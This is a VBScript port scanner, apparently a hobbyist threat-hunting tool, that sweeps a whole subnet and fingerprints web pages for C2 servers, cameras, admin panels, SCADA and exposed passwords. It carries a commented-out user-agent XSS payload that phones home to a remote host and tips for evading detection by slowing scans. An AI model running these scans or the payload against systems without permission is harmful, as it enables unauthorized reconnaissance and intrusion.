'Flying Monkeyz Port Scanner
'Author: Rick Cable (CyberAbyss)
'Version 7.1
'Released for educational purposes without warranty

'For next update make the script capable of using specific user-agent strings to find hidden command and control servers.
'Refrence this Sans video on threat hunting
'https://www.youtube.com/watch?v=GjquFKa4afU&ab_channel=SANSDigitalForensicsandIncidentResponse
'This one is suspect,might be hacker group: Dectected: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:79.0) Gecko/20100101 Firefox/79.0
'We can also put payloads in the user Agent. This one phones home.
'strUserAgent = "<script src=http://[IPAddress]></script>"
strUserAgent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.3; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729)"


ON ERROR RESUME NEXT
'#Get Input
' Use command line argument first for use with Monkey Trainer Outside Loop, If not provided it will ask for it
'Enable this line for use with Monkey Launcher
IPFromMonkeyLauncher = WScript.Arguments.Item(0)
Error.Clear
'strUserSelectedIP = IPFromMonkeyTrainer

if IPFromMonkeyLauncher = "" then
	'Ask for User Input
	strUserSelectedIP = InputBox("Target IP address:", "Target IP")
	'strUserSelectedScanType = InputBox("Type of scan? (Short, Long or Mass)", "Scan Type - S, L or M")
	TextToSpeech("Starting Threat Detection Scan of your selected IP Address, " & strUserSelectedIP & ". Here we go!")
Else
	strUserSelectedIP = IPFromMonkeyLauncher
	'TextToSpeech("Starting Threat Detection Scan of your selected IP Ranges!  Here we go!")
end if

if strUserSelectedIP = "" Then
	WScript.Quit
end if

'#Define global variables

rootPath = "C:\scripts\01-Monkeyz"
scrapePath = "C:\scripts\01-Monkeyz\scrape\"
scanPath = "C:\scripts\01-Monkeyz\scans\"
completedPath = "C:\scripts\01-Monkeyz\scans_completed\"

if strUserSelectedIP <> "" Then
	targetIP = strUserSelectedIP
end if

target = "http://" & targetIP
sTarget = "https://" & targetIP
strNewLine = Chr(13) & Chr(10)
currentFileName = "log-" & targetIP & ".csv" 
iCurrentFileSize = 0
outFile = scanPath & currentFileName		'File Path
completedFile = completedPath & currentFileName
errorLogFile = "error-log.csv"	'Error Log File Path
showFoundMessage = false
logCalls = False
hasHTTPError = false
hitCounter = 0 		'Counts how many finds we've had, if 0 just delete the file at the end of the process
logOnEvery = 100
'Example shows 10 * 10000 form miliseconds to seconds
httpTimeout = 500
'Long Port List
'commonPortsList = "80,81,82,88,8080,8081,1024,1337,1000,2000,3000,4000,4550,5000,5150,5160,5511,5554,6000,6036,6550,7000,8000,8082,8090,8866,9000,10000,32400,554,555,1024,1337,4840,7447,8554,7070,10554,6667,8090,9100,9200,19999,40056,50000,56000"
'Short Port List Havoc C2 default port is 40056
'commonPortsList = "80,8080"
commonPortsList = "80,81,8080,40056"
'Common IP Camera and Security Camera IPs
'commonPortsList = "80,81,82,6036,7000,5554,8080,8081,8082,5150,5160,4550,5511,5550,6550,8866,56000,10000,40056"
arrCommonPorts = split(commonPortsList,",")
'Common target types
'تلگرام is Telegram in Persian
'Пустая страница is Empty Page in Russian

'торрент трекер is torrent tracker in Russian
'luxteb is Iranian Medical Software Company. Found 4/4/2023
'redirect_suffix is for QNAP NAS redirect page found 4/3/2023

'没有找到站点 is Site Not Found in Chinese
'若您的浏览器无法跳转 is If your browser cannot jump in Chinese
strChinesePhrases = "没有找到站点,若您的浏览器无法跳转"
strTargetTypes = "window.open,Telgram.js,Account-Suspended,Website-Unavailable,Cobalt Strike,Metasploit,Sliver,Havoc,Hak5 Cloud C²,Hak5 Cloud,Hak5 , C² ,XSSez,XSS Hunter,XSStrike,XSSER,Acunetix,Burp Suite,Intruder,Dalfox,The Hunted,China Chopper,LOKI,/admin,/backup,INSTAR Full-HD IP-Camera,impulse CRM,bitrix,D-Link,live-video,PACS,U.Tel-G242,TP-LINK,WEB Management System,main-video,Caddy works,FASTPANEL,Icecast,Burp Collaborator Server,Connection denied by Geolocation Setting,pfsense,Rebellion,Lua Configuration Interface,WAMPSERVER homepage,webcamXP 5,Your server is now running,Synology,relay for the Tor Network,TURN Server,Filemaker,Directory listing for,AutoSMTP,PowerMTA,Adminer,Wowza Media Server,Wowza Streaming Engine,Tor Exit Server,DD-WRT Control Panel,database,DB,Blue Iris,SCADA,Swagger UI,SmarterMail,Keycloak,OctoPos,blog,docker,Nginx Proxy Manager,phpMyAdmin,patriot,antifa,communist,communism,socialist,workers party,Looking Glass Point,Plesk,OoklaServer,Nagios,HTTP Parrot,Welcome to CentOS,Index of,payment method,listing:,Client sent an HTTP request to an HTTPS server,Ruby on Rails,FreePBX,Tor Exit Router,The Shadowserver Foundation,Georgia Institute of Technology,CentOS-WebPanel,PHP Version,luxteb,popper.js,Nexus Repository Minecraft Server,patriot,antifa,communist,communism,socialist,Islam,Jihad,workers party,Aryan,nazi,anarcist,Anarchism,Tor Exit Router,hacker,hacking,hacked,hack,hospital ,ISPmanager,defaultwebpage.cgi,.asp?,index.js,500 Internal Server Error,IIS,Apache,Swagger Editor,Node Exporter,Plone,webcam,webcamXP,Webmail,redirect_suffix,NextFiber Monitoring,Nexcess,nginx,router configuration,Network Security Appliance,Admin Panel,IKCard Web Mail,Amazon ECS,Unknown Domain,Lucee,ZITADEL • Console,OpenResty,NETSurveillance,WEB SERVICE,Bootstrap Theme,Coming Soon,Droplet,Your new web server,تلگرام,ASP.NET,Video Collection,Wowza Streaming Engine,You need to enable JavaScript,Пустая страница,торрент трекер,CTF platform,qBittorrent,Shared IP,webui,XFINITY,Calix Home Gateway,money-saving offers,laravel,ListAllMyBucketsResult,Cloudflare network,LeakIX scanning network,secret,APIKey,Payment,Login,Site Not Found,report,Lorem ipsum,Page not found, NAS ,Manager,content is to be added,password:,password=,username=,document.location.href," & strChinesePhrases

'strTargetTypes = "index of,Cobalt Strike,Metasploit,Sliver,Havoc,Hak5 Cloud C²,Hak5 Cloud,Hak5 , C² ,Hak5,XSSez,XSS Hunter,XSStrike,XSSER,Acunetix,Burp Suite,Intruder,Dalfox,DB , DB,database,Icecast,Burp Collaborator Server,Burp,pfsense,relay for the Tor Network,Tor Exit Server,control panel,admin panel,patriot,antifa,communist,communism,socialist,workers party,Tor Exit Router,hacker,hacking,hacked,hack ,CTF,Cyber,report,jenkins"

'Modified Target Types for Cloud Threat Hunting
'strTargetTypes = "Cobalt Strike,Metasploit,Sliver,Havoc,Hak5 Cloud C²,Hak5 Cloud,Hak5 , C² ,Hak5,XSSez,XSS Hunter,XSStrike,XSSER,XSSez,XSS ,Acunetix,Burp Suite,Burp,Intruder,Dalfox,DB , DB,database,Collaborator Server,Burp,relay for the Tor Network,Tor Exit Server,patriot,antifa,communist,communism,socialist,Islam,Jihad,workers party,Tor Exit Router,hacker,hacking,hacked,hack"

arrTargetTypes = Split(strTargetTypes,",")
doWeScrapeContent = true
strDoNotScrapeList = "Grafana,WEB Management System,NETSurveillance,WEB SERVICE,router configuration,Caddy works,FASTPANEL,Lua Configuration Interface,400 Bad Request,PHP Version,Network Security Appliance,Your server is now running,phpMyAdmin,AutoSMTP,Cloudflare network,nginx,laravel,CentOS-WebPanel,IIS,qBittorrent,Apache,Node Exporter,Shared IP,Droplet,Coming Soon,webui,defaultwebpage.cgi,money-saving offers,Plesk,Unknown Domain,Your new web server,Welcome to CentOS,没有找到站点,没有找到站点,Nginx Proxy Manager,document.location.href," & strChinesePhrases

strInterestingItems = "torrent,movies,.mkv,.mp4,.mp3,downloads,HDCAM,.x264"
arrInterestingItems = split(strInterestingItems,",")

arrDoNotScrapeList = Split(strDoNotScrapeList,",")
currentTargetType = ""
currentHTTPStatus = ""
currentPageTitle = ""

'Well-Known Ports (0-1023)
'Registered Ports (1024 - 49,151)
'Dynamic / Private Ports (49,152 - 65,535)
iStep = 1
iStartPort = 0	'Max Value is 65535
iEndPort = 65535	'Max TCP Value is 65535 / UPD is 65536
isShortScan = False
isLongScan = False
isMassScan = True	'Mass Scan runs a short scan on all IP addresses in the target IP's subnet

'Create log file in CSV format and seed header row
Sub CreateLogFile(strFileName)
	'Create the File System Object= 
	Set objFSO = CreateObject("Scripting.FileSystemObject")

	'Setup file to write
	if NOT objFSO.FileExists(strFileName) then
		Set objFile = objFSO.CreateTextFile(strFileName,True)
		'Write out the header line for each of the two types of log files
		if strFileName = "error-log.csv" then
			objFile.WriteLine("Date,Module,Error")
		Else
			objFile.WriteLine("Date,File Size,URL,Title,Event/Repsonse,Target_Type")
		end if
		
		objFile.Close
	End If
	ReportError("CreateLogFile")
End Sub

'Called from each function, checks to see if error was gernerated and report it to the screen then clear it.
Sub ReportError(strFunction)
	If Err.Number <> 0 Then
		LogErrorEventCSV Now,strFunction,Err.Description
		'WScript.Echo "Error in " & strFunction & ": " &  Err.Description
		Err.Clear
	End If
End Sub

'LogEventCSV: Called by MonitorUptime: Logs events in the csv file
Sub LogEventCSV(strDate,iFileSize,strURL,strPageTitle,strStatus)
	'Create the File System Object
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objFile = objFSO.OpenTextFile(outfile, 8)	'8 = ForAppending https://technet.microsoft.com/en-us/library/ee198716.aspx

	temp = strDate & "," & iFileSize & "," & strURL & "," & strPageTitle & "," & strStatus	
	
	'Only log the intereting stuff
	if currentTargetType <> "" then
		objFile.WriteLine(temp)
	end if
	'objFile.WriteLine(temp2)
	
	objFile.Close
	ReportError("LogEventCSV")
	currentTargetType = ""
End Sub

'http://dwarf1711.blogspot.com/2007/10/vbscript-urlencode-function.html
Function URLEncode(ByVal str)
	Dim strTemp, strChar
	Dim intPos, intASCII
	strTemp = ""
	strChar = ""
	For intPos = 1 To Len(str)
		intASCII = Asc(Mid(str, intPos, 1))
		If intASCII = 32 Then
			strTemp = strTemp & "+"
		ElseIf ((intASCII < 123) And (intASCII > 96)) Then
			strTemp = strTemp & Chr(intASCII)
		ElseIf ((intASCII < 91) And (intASCII > 64)) Then
			strTemp = strTemp & Chr(intASCII)
		ElseIf ((intASCII < 58) And (intASCII > 47)) Then
			strTemp = strTemp & Chr(intASCII)
		Else
			strChar = Trim(Hex(intASCII))
			If intASCII < 16 Then
				strTemp = strTemp & "%0" & strChar
			Else
				strTemp = strTemp & "%" & strChar
			End If
		End If
	Next
	URLEncode = strTemp
End Function

Function GetPageTitle(strResponse)
	iTitleStart = InStr(1,strResponse,"<title>",1)
	iTitleEnd = InStr(1,strResponse,"</title>",1)
	
	if iTitleStart > 0 and iTitleEnd > 0 then
		GetPageTitle = Replace(Mid(strResponse,iTitleStart+7,(iTitleEnd-1 - iTitleStart)-6),",","&#38;")	
		currentPageTitle = GetPageTitle
	end if
End Function

'isWebsiteOffline: Takes String URL 
'isPortalOffiline Returns (True / False)
Function isWebsiteOffline(strURL)
	On Error Resume Next
	
	if InStr(strURL, ":443") > 0 OR InStr(strURL, ":1337") Then
		strURL = Replace(strURL,"http","https")
	end if
	'Check for hidden FTP servers
	if InStr(strURL, ":22") > 0 Then
		strURL = Replace(strURL,"http","ftp")
	end if
	'Set WshShell = WScript.CreateObject("WScript.Shell")

	'Note 3/12/2023: From testing results... 
	'The timeout settings: 
	'1000: 1 HTTP call every 3 seconds
	'500: 1 HTTP call every 2 seconds
	'150: 1 HTTP call every 1 second
	'You can try to set them lower but I'm not sure what the minimum values could be w/o making it malfunction
	'Also: If you want to try and avoid detection, slow it down!
	
	'Reference: https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms760403(v=vs.85)
	'Set http = CreateObject("MSXML2.ServerXMLHTTP")
	'Adding new version ServerXMLHTTP.6.0 so we can use the timeout options (only in version 3 & 6) 
	Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
	currentTargetType = ""
	lResolve = 5 * httpTimeout 
	lConnect = 5 * httpTimeout  
	lSend = 15 * httpTimeout 
	lReceive = 15 * httpTimeout  
	http.setTimeouts lResolve, lConnect, lSend, lReceive
	 	'Set http = CreateObject("Microsoft.XmlHttp")
	http.open "GET", strURL, False
	strUserAgentTemp = Replace(strUserAgent,".213",".213?ip=" & Replace(strURL,"http://",""))
	'msgbox(strUserAgentTemp)
	http.setRequestHeader "User-Agent", strUserAgent  
	http.send ""
	strUserAgentTemp = ""
	
	
	CheckForFTP = false

	'Only check for error of the HTTP Get request for 200 or 404 code returned. If any status is returned then the server is up
	if err.number <> 0 Then	'Site is down
		'msgbox("I've got an error")
		isWebsiteOffline = True
		SweepHasErrors = True
	Else
		'Wscript.Echo "error" & Err.Number & ": " & Err.Description
		isWebsiteOffline = False
		'Check to see if the response is a 400 error
		if Left(http.status,1) = "2" Then
			hasHTTPError = false
			doWeScrapeContent = true
			iCurrentFileSize = Len(http.responseText)
		Else
			hasHTTPError = true
			if CheckForFTP = true AND InStr(strURL,"ftp") = 0 then
				strURL = Replace(strURL,"http","ftp")
				http.open "GET", strURL, False
				http.send ""
			end if
			if Left(http.status,1) = "2" Then
				hasHTTPError = false
			end if			
		end if
		
	End If
	
	if isWebsiteOffline = False then
		if showFoundMessage then
			msgbox("Found!")
		end if	

		'Check to see if we can determine what type of site this is
		if NOT hasHTTPError then
			For each item in arrTargetTypes
				'msgbox(item)
				if currentTargetType <> "" Then
					Exit For
				End if
				if InStr(1,http.responseText,item,0) > 0 Then
					currentTargetType = item
				end if
			Next		
			
			if currentTargetType = "Hak5 Cloud C²" then
				TextToSpeech("Heads Up! Found Hack 5 Command and Control Server")
			end if
					
			'strInterestingItems = "torrent,movies,.mkv,.mp4,.mp3,downloads"
			'arrInterestingItems = split(strInterestingItems,",")
					
			'If target type is Index of, check to see if there is anything interesting for download
			if currentTargetType = "Index of" AND iCurrentFileSize > 480 then
				For each itemz in arrInterestingItems
					if InStr(1,http.responseText,itemz,0) > 0 Then
						currentTargetType = currentTargetType & "+" & itemz 
						TextToSpeech("Heads Up! Found " & itemz)
					end if
				Next
			else
				currentTargetType = currentTargetType 
			end if
			
			
			'do not scrape these types
			for each item in arrDoNotScrapeList
				if currentTargetType = "" then
					doWeScrapeContent = true
				end if
				if item = currentTargetType Then
					doWeScrapeContent = false
				end if
				if Len(http.responseText) < 50 Then
					doWeScrapeContent = false
				end if
			next
		end if

		tempPageTitle = GetPageTitle(http.responseText)	

		'if Title is empty lets see if there is a body tag and if the contents are small enough to include in the file name when scraped
		 
		if tempPageTitle = "" Then
			'msgbox("Page title is blank")
			iBodyStart = Instr(1,http.responseText,"<body>",0)
			'MsgBox("Body starts at" & iBodyStart)
			if iBodyStart > 0 Then	'if greater than 0, we have a body tag start position
				iBodyEnd =  Instr(1,http.responseText,"</body>",0)
				if iBodyEnd > 0 Then
					'MsgBox("Body end starts at" & iBodyEnd)
					iBodyEnd = iBodyEnd - 1
					iBodyStart = iBodyStart + 7
				end if				
				tempPageTitle = Mid(Replace(Mid(http.responseText, iBodyStart, iBodyEnd-iBodyStart)," ","-"),1,50)
				'MsgBox(tempPageTitle)
			end if
		end if

		doWeScrapeContent = false	
		if doWeScrapeContent Then
			'msgbox("Downloading " & strURL)		
			arrTempURL = Split(strURL,":")
			if currentTargetType <> "" then
				DownLoadFile strURL, scrapePath & arrTempURL(1) & "-" & arrTempURL(2) & "-" & currentTargetType & "-" & Replace(Mid(tempPageTitle,1,45)," ","-") & ".html"
			Else
				DownLoadFile strURL, scrapePath & arrTempURL(1) & "-" & arrTempURL(2) & "-" & Replace(Mid(tempPageTitle,1,55)," ","-") & ".html"
			end if
			
		end if		
		
		'LogEventCSV Now(),strURL,http.status
        LogEventCSV Now(),iCurrentFileSize,strURL,currentPageTitle,http.status & " found," & currentTargetType & "!"
		hitCounter = hitCounter + 1
		currentTargetType = ""
		currentPageTitle = ""
	end if
		

	'set WshShell = Nothing
	Set http = Nothing	

	if isWebsiteOffline then
        'msgbox("Heads Up! Site is now Offline " & isWebsiteOffline & ": " & Now())
	end if
	err.clear
	hasHTTPError = false
	doWeScrapeContent = true
End Function

Function runShortScan(target)
	'Short Scan from List
	For each item in arrCommonPorts
		'msgbox("Scanning " & target1 & iLastOctet & ":" & i)
		if logCalls then
			LogEventCSV Now(),target & ":" & item,"Calling"
		end if
		call isWebsiteOffline(target & ":" & item)
	Next
	currentTargetType = ""
End Function

Function runLongScan(target)
	'Long Scan Loop
		For i = iStartPort to iEndPort Step iStep
			'msgbox("Scanning " & target1 & iLastOctet & ":" & i)
			if logCalls then
				'msgbox(i Mod logOnEvery)
				if i Mod logOnEvery = 0 then
					LogEventCSV Now(),target & ":" & i,"Calling"
				end if
			end if
			call isWebsiteOffline(target & ":" & i)
		Next
		currentTargetType = ""
End Function

Function runMassScan(target)		
	For iLastOctet = 0 to 255
		hitCounter = 0
		'MsgBox(target & "." & iLastOctet)	
		runShortScan(target & "." & iLastOctet)
		currentTargetType = ""		
	Next	
End Function


Sub DownloadFile(url,filePath)
    Dim WinHttpReq, attempts
    attempts = 3
    'On Error GoTo TryAgain
'TryAgain:
    attempts = attempts - 1
    Err.Clear
    If attempts > 0 Then
        Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
        WinHttpReq.Open "GET", url, False
        WinHttpReq.send
		currentHTTPStatus = WinHttpReq.Status
		'if currentHTTPStatus = 400 Then
			'Try with HTTPS
		'	tempURL = Replace(url,"http","https")
		'	DownloadFile tempURL,filePath
		'end if
		
        If WinHttpReq.Status = 200 Then
            Set oStream = CreateObject("ADODB.Stream")
            oStream.Open
            oStream.Type = 1
            oStream.Write WinHttpReq.responseBody
            oStream.SaveToFile filePath, 2 ' 1 = no overwrite, 2 = overwrite
            oStream.Close
        End If
    End If
	currentTargetType = ""
End Sub

Sub TextToSpeech(strText)
	Dim voiceIndex
	Dim sapi
	voiceIndex = 0
	Set sapi = createObject("sapi.spvoice")
	Set sapi.Voice = sapi.GetVoices.Item(voiceIndex)
	sapi.Speak strText
End Sub

'Start processing commands here!
CreateLogFile("error-log.csv")
CreateLogFile(outfile)

	call CreateLogFile(outFile)
	call CreateLogFile(errorLogFile)

	if isShortScan then
		runShortScan(target)
	end if
	
	if isLongScan then
		runLongScan(target)
	end if
	
	if isMassScan then
		arrTemp = Split(target, ".")
		target = arrTemp(0) & "." & arrTemp(1) & "." & arrTemp(2)
		runMassScan(target)
	end if
	
	'If file has no results, delete the file, else, move to completed folder for further review
	Set FSO = CreateObject("Scripting.FileSystemObject")
	if hitCounter < 0 then
		if FSO.FileExists(outFile) then
			FSO.DeleteFile outFile
		end if
	else
		FSO.MoveFile outFile, completedFile
	end if
	FSO.Close

'msgbox("Completed port scan on " & target & " with port # " & i & ".")
